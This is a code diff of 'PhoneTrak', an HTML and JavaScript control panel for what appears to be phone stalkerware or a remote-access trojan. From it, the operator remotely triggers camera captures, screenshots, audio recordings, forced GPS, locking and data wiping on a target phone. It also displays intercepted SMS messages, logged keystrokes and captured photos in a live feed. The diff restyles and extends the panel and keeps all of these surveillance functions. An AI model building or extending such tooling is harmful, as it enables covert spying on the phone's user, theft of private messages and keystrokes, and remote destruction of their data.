@@ -2,172 +2,230 @@
 <html>
 <head>
     <title>PhoneTrak Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0a; color: #fff; font-family: monospace; }
-        .header { background: #111; padding: 15px; border-bottom: 2px solid #4CAF50; }
-        .header h1 { color: #4CAF50; font-size: 20px; }
+        body { background: #0a0a0a; color: #fff; font-family: 'Courier New', monospace; }
+        .header { background: #111; padding: 15px 20px; border-bottom: 2px solid #4CAF50; display: flex; justify-content: space-between; align-items: center; }
+        .header h1 { color: #4CAF50; font-size: 22px; }
+        .status-dot { display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
+        .online { background: #4CAF50; box-shadow: 0 0 8px #4CAF50; }
+        .offline { background: #f44336; }
         .container { display: flex; height: calc(100vh - 60px); }
-        .sidebar { width: 300px; background: #111; padding: 15px; overflow-y: auto; }
-        .main { flex: 1; padding: 15px; overflow-y: auto; }
-        .card { background: #1a1a1a; border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
-        .card h3 { color: #4CAF50; margin-bottom: 10px; }
-        .btn { background: #4CAF50; color: #fff; border: none; padding: 8px 15px; margin: 3px; cursor: pointer; border-radius: 4px; font-size: 12px; }
-        .btn:hover { background: #388E3C; }
-        .btn.danger { background: #f44336; }
-        .btn.danger:hover { background: #c62828; }
-        .btn.blue { background: #2196F3; }
-        .data-row { padding: 5px 0; border-bottom: 1px solid #222; font-size: 13px; }
-        .data-row .time { color: #888; }
-        .data-row .content { color: #ccc; }
-        .log { background: #000; padding: 10px; max-height: 400px; overflow-y: auto; font-size: 12px; }
-        .log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
+        .sidebar { width: 280px; background: #111; padding: 15px; overflow-y: auto; border-right: 1px solid #222; }
+        .main { flex: 1; padding: 20px; overflow-y: auto; }
+        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
+        .card h3 { color: #4CAF50; margin-bottom: 12px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+        .btn { padding: 10px 14px; margin: 3px; cursor: pointer; border: none; border-radius: 6px; font-size: 12px; font-family: inherit; transition: all 0.2s; }
+        .btn:hover { transform: scale(1.05); }
+        .btn-green { background: #4CAF50; color: #fff; }
+        .btn-blue { background: #2196F3; color: #fff; }
+        .btn-red { background: #f44336; color: #fff; }
+        .btn-orange { background: #FF9800; color: #fff; }
+        .btn-purple { background: #9C27B0; color: #fff; }
+        .log { background: #000; border: 1px solid #222; border-radius: 8px; padding: 12px; max-height: 500px; overflow-y: auto; font-size: 12px; line-height: 1.6; }
+        .log .entry { padding: 5px 0; border-bottom: 1px solid #1a1a1a; }
         .log .sms { color: #64B5F6; }
         .log .keystroke { color: #FFB74D; }
         .log .photo { color: #81C784; }
+        .log .audio { color: #CE93D8; }
         .log .command { color: #E57373; }
-        input, select { background: #222; color: #fff; border: 1px solid #444; padding: 8px; margin: 5px 0; width: 100%; border-radius: 4px; }
-        .live-indicator { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
-        .live { background: #4CAF50; }
-        .dead { background: #f44336; }
+        .log .time { color: #555; font-size: 10px; }
+        .input { background: #222; color: #fff; border: 1px solid #444; padding: 10px; margin: 5px 0; width: 100%; border-radius: 6px; font-family: inherit; }
+        .input:focus { outline: none; border-color: #4CAF50; }
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .stat { background: #111; padding: 10px; border-radius: 6px; text-align: center; }
+        .stat .value { font-size: 24px; color: #4CAF50; }
+        .stat .label { font-size: 10px; color: #888; }
+        #photoPreview img { max-width: 100%; border-radius: 8px; margin-top: 10px; }
+        .tab { display: inline-block; padding: 8px 15px; cursor: pointer; background: #222; margin-right: 5px; border-radius: 6px 6px 0 0; font-size: 12px; }
+        .tab.active { background: #4CAF50; color: #fff; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>🔍 PhoneTrak Control Panel</h1>
+        <div id="deviceIndicator">
+            <span class="status-dot offline" id="statusDot"></span>
+            <span id="statusText">No device connected</span>
+        </div>
     </div>
+    
     <div class="container">
         <div class="sidebar">
             <div class="card">
-                <h3>Device Status</h3>
-                <div id="deviceStatus">
-                    <span class="live-indicator dead"></span> No device connected
+                <h3>📱 Device Info</h3>
+                <div class="stats">
+                    <div class="stat"><div class="value" id="batteryVal">--</div><div class="label">Battery</div></div>
+                    <div class="stat"><div class="value" id="commandsVal">0</div><div class="label">Commands</div></div>
+                    <div class="stat"><div class="value" id="smsVal">0</div><div class="label">SMS</div></div>
+                    <div class="stat"><div class="value" id="keysVal">0</div><div class="label">Keys</div></div>
                 </div>
             </div>
+            
             <div class="card">
-                <h3>Quick Commands</h3>
-                <button class="btn" onclick="sendCmd('ring')">🔔 Ring</button>
-                <button class="btn" onclick="sendCmd('camera_front')">📸 Front Camera</button>
-                <button class="btn" onclick="sendCmd('camera_back')">📸 Back Camera</button>
-                <button class="btn" onclick="sendCmd('screenshot')">📱 Screenshot</button>
-                <button class="btn" onclick="sendCmd('audio_record')">🎤 Record Audio</button>
-                <button class="btn" onclick="sendCmd('gps')">📍 Get GPS</button>
-                <button class="btn" onclick="sendCmd('app_list')">📋 App List</button>
-                <button class="btn danger" onclick="sendCmd('lock')">🔒 Lock</button>
-                <button class="btn danger" onclick="sendCmd('wipe_data')">🗑️ Wipe</button>
+                <h3>🎮 Quick Commands</h3>
+                <button class="btn btn-green" onclick="sendCmd('ring')">🔔 Ring Alarm</button>
+                <button class="btn btn-blue" onclick="sendCmd('camera_front')">📸 Front Camera</button>
+                <button class="btn btn-blue" onclick="sendCmd('camera_back')">📸 Back Camera</button>
+                <button class="btn btn-purple" onclick="sendCmd('screenshot')">📱 Screenshot</button>
+                <button class="btn btn-orange" onclick="sendCmd('gps')">📍 Force GPS</button>
+                <button class="btn btn-red" onclick="sendCmd('lock')">🔒 Lock Device</button>
             </div>
+            
             <div class="card">
-                <h3>Audio Settings</h3>
-                <input type="number" id="audioDuration" value="30" placeholder="Duration (seconds)">
-                <button class="btn blue" onclick="sendCmd('audio_record', {duration: document.getElementById('audioDuration').value})">
-                    Start Recording
+                <h3>🎤 Audio Recording</h3>
+                <input type="number" id="audioDuration" class="input" value="30" placeholder="Seconds">
+                <button class="btn btn-orange" onclick="sendCmd('audio_record', {duration: parseInt(document.getElementById('audioDuration').value)})">
+                    🎤 Record Audio
                 </button>
             </div>
-        </div>
-        <div class="main">
+            
             <div class="card">
-                <h3>📊 Live Data Feed</h3>
+                <h3>🗑️ Danger Zone</h3>
+                <button class="btn btn-red" onclick="if(confirm('Wipe all data?')) sendCmd('wipe_data')">🗑️ Wipe Device</button>
+            </div>
+        </div>
+        
+        <div class="main">
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('all')">All Data</div>
+                <div class="tab" onclick="switchTab('sms')">💬 SMS</div>
+                <div class="tab" onclick="switchTab('keystroke')">⌨️ Keys</div>
+                <div class="tab" onclick="switchTab('photo')">📷 Photos</div>
+                <div class="tab" onclick="switchTab('audio')">🎤 Audio</div>
+                <div class="tab" onclick="switchTab('command')">📋 Commands</div>
+            </div>
+            
+            <div class="card">
                 <div class="log" id="dataFeed">
-                    <div class="entry">Waiting for data...</div>
+                    <div class="entry" style="color:#555">Waiting for data... Send a command to get started.</div>
                 </div>
             </div>
-            <div class="card">
-                <h3>📷 Latest Photo</h3>
-                <div id="photoViewer">
-                    <p style="color:#888">No photos captured yet</p>
-                </div>
+            
+            <div class="card" id="photoCard" style="display:none">
+                <h3>📷 Latest Capture</h3>
+                <div id="photoPreview"></div>
             </div>
         </div>
     </div>
 
     <script>
+        let currentTab = 'all';
         let deviceId = '';
-        let wsUrl = 'ws://' + window.location.hostname + ':8765';
+        let allData = [];
         
-        // Connect to WebSocket server for live data
-        function connectLiveData() {
-            // Poll the HTTP API for now since we can't connect WS from browser to same port easily
-            setInterval(refreshData, 3000);
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+            renderData();
         }
         
-        function refreshData() {
-            fetch('/ws/data?device_id=' + deviceId)
-                .then(r => r.json())
-                .then(data => {
-                    if (data.data && data.data.length > 0) {
-                        updateFeed(data.data);
-                    }
-                });
-            
-            fetch('/ws/devices')
-                .then(r => r.json())
-                .then(data => {
-                    if (data.devices && data.devices.length > 0) {
-                        const device = data.devices[0];
-                        deviceId = device.device_id;
-                        document.getElementById('deviceStatus').innerHTML = 
-                            '<span class="live-indicator live"></span> ' +
-                            device.device_id.substring(0, 8) + '... | ' +
-                            '🔋' + (device.battery || '?') + '% | ' +
-                            '📍' + (device.location || 'Unknown');
-                        
-                        if (device.location) {
-                            document.getElementById('deviceStatus').querySelector('.live-indicator').className = 'live-indicator live';
-                        }
-                    }
-                });
-        }
-        
-        function updateFeed(data) {
-            const feed = document.getElementById('dataFeed');
-            let html = '';
-            data.reverse().forEach(item => {
-                const time = item.timestamp ? item.timestamp.substring(11, 19) : '';
-                const typeClass = item.type || '';
-                let content = '';
+        async function refreshData() {
+            try {
+                // Try to find device
+                const devResp = await fetch('/v1/devices/31dbb4c1-814f-4782-8f8c-29b9914e6c64');
+                const devices = await devResp.json();
                 
-                if (item.type === 'sms') {
-                    content = '💬 SMS: ' + (item.data.sender || '') + ' - ' + (item.data.body || '');
-                } else if (item.type === 'keystroke') {
-                    content = '⌨️ Key: [' + (item.data.app || '') + '] ' + (item.data.text || '');
-                } else if (item.type === 'photo') {
-                    content = '📸 Photo captured!';
-                    // Show photo
-                    if (item.data.photo) {
-                        document.getElementById('photoViewer').innerHTML = 
-                            '<img src="data:image/jpeg;base64,' + item.data.photo + '" style="max-width:100%;border-radius:8px;">';
-                    }
-                } else if (item.type === 'audio') {
-                    content = '🎤 Audio recorded (' + (item.data.duration || '?') + 's)';
-                } else if (item.type === 'command_result') {
-                    content = '✅ Command result: ' + JSON.stringify(item.data);
-                } else {
-                    content = JSON.stringify(item);
+                if (devices.length > 0) {
+                    deviceId = devices[0].device_id || devices[0].id;
+                    document.getElementById('statusDot').className = 'status-dot online';
+                    document.getElementById('statusText').textContent = 'Device Connected';
+                    document.getElementById('batteryVal').textContent = (devices[0].last_battery || '?') + '%';
                 }
                 
-                html += '<div class="entry ' + typeClass + '"><span class="time">' + time + '</span> ' + content + '</div>';
-            });
-            feed.innerHTML = html || '<div class="entry">No data yet</div>';
+                // Get live data
+                if (deviceId) {
+                    const dataResp = await fetch('/v1/monitor/commands/31dbb4c1-814f-4782-8f8c-29b9914e6c64');
+                    const commands = await dataResp.json();
+                    document.getElementById('commandsVal').textContent = commands.length;
+                    
+                    allData = commands.map(c => ({
+                        type: c.command_type,
+                        data: c.result || {},
+                        timestamp: c.executed_at || c.created_at,
+                        status: c.status
+                    }));
+                    
+                    renderData();
+                }
+            } catch (e) {
+                console.error(e);
+            }
         }
         
-        function sendCmd(cmd, extra = {}) {
-            fetch('/ws/command', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    device_id: deviceId,
-                    command: {type: cmd, ...extra}
-                })
-            })
-            .then(r => r.json())
-            .then(data => {
-                const feed = document.getElementById('dataFeed');
-                feed.innerHTML = '<div class="entry command">📤 Command sent: ' + cmd + ' (' + (data.sent ? 'sent' : 'queued') + ')</div>' + feed.innerHTML;
+        function renderData() {
+            const feed = document.getElementById('dataFeed');
+            let data = allData;
+            
+            if (currentTab !== 'all') {
+                data = allData.filter(d => d.type === currentTab);
+            }
+            
+            if (data.length === 0) {
+                feed.innerHTML = '<div class="entry" style="color:#555">No data yet. Send a command!</div>';
+                return;
+            }
+            
+            // Counts
+            document.getElementById('smsVal').textContent = allData.filter(d => d.type === 'sms').length;
+            document.getElementById('keysVal').textContent = allData.filter(d => d.type === 'keystroke').length;
+            
+            let html = '';
+            data.slice(-50).reverse().forEach(d => {
+                const time = (d.timestamp || '').substring(11, 19) || '';
+                const cls = d.type || '';
+                
+                if (d.type === 'sms') {
+                    html += `<div class="entry sms"><span class="time">${time}</span> 💬 SMS: ${d.data.sender || ''}: ${d.data.body || ''}</div>`;
+                } else if (d.type === 'keystroke') {
+                    html += `<div class="entry keystroke"><span class="time">${time}</span> ⌨️ [${d.data.app || ''}] ${d.data.text || ''}</div>`;
+                } else if (d.type === 'photo' || d.type === 'camera_front' || d.type === 'camera_back') {
+                    html += `<div class="entry photo"><span class="time">${time}</span> 📸 Photo captured</div>`;
+                    if (d.data && d.data.photo) {
+                        document.getElementById('photoCard').style.display = 'block';
+                        document.getElementById('photoPreview').innerHTML = 
+                            `<img src="data:image/jpeg;base64,${d.data.photo}" style="max-width:100%;border-radius:8px;">`;
+                    }
+                } else if (d.type === 'audio' || d.type === 'audio_record') {
+                    html += `<div class="entry audio"><span class="time">${time}</span> 🎤 Audio recorded</div>`;
+                } else if (d.type === 'command' || d.status === 'executed') {
+                    html += `<div class="entry command"><span class="time">${time}</span> ✅ ${d.type}: ${d.status}</div>`;
+                } else {
+                    html += `<div class="entry"><span class="time">${time}</span> ${d.type}: ${d.status || 'sent'}</div>`;
+                }
             });
+            
+            feed.innerHTML = html;
+        }
+        
+        async function sendCmd(cmd, extra = {}) {
+            const feed = document.getElementById('dataFeed');
+            feed.innerHTML = '<div class="entry command">📤 Sending: ' + cmd + '...</div>' + feed.innerHTML;
+            
+            try {
+                const resp = await fetch('/v1/commands/send', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        user_id: '31dbb4c1-814f-4782-8f8c-29b9914e6c64',
+                        device_id: deviceId,
+                        command_type: cmd,
+                        command_data: JSON.stringify(extra)
+                    })
+                });
+                const result = await resp.json();
+                feed.innerHTML = '<div class="entry command">📤 ' + cmd + ': ' + (result.message || 'Sent') + '</div>' + feed.innerHTML;
+            } catch (e) {
+                feed.innerHTML = '<div class="entry" style="color:red">❌ Failed to send command</div>' + feed.innerHTML;
+            }
         }
         
         // Start
-        connectLiveData();
+        setInterval(refreshData, 3000);
         refreshData();
     </script>
 </body>
